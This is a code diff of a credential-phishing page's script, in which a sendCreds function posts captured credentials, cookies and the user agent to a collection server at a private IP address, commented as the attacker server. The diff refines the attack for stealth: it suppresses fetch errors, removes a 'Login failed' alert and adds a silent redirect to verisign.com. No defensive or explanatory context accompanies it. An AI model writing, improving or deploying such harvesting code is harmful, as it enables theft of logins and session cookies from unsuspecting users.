@@ -51,6 +51,7 @@
     function sendCreds(e) {
       e.preventDefault();
 
+      // Send credentials to attacker server
       fetch("http://192.168.1.6:8000/collect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -60,13 +61,12 @@
           cookies: document.cookie,
           userAgent: navigator.userAgent
         })
-      });
+      }).catch(() => {});
 
-      alert("Login failed. Please try again.");
-
+      // Silent redirect to legitimate site
       setTimeout(() => {
         window.location.href = "https://www.verisign.com/";
-      }, 2000);
+      }, 1500);
     }
   </script>
 </body>
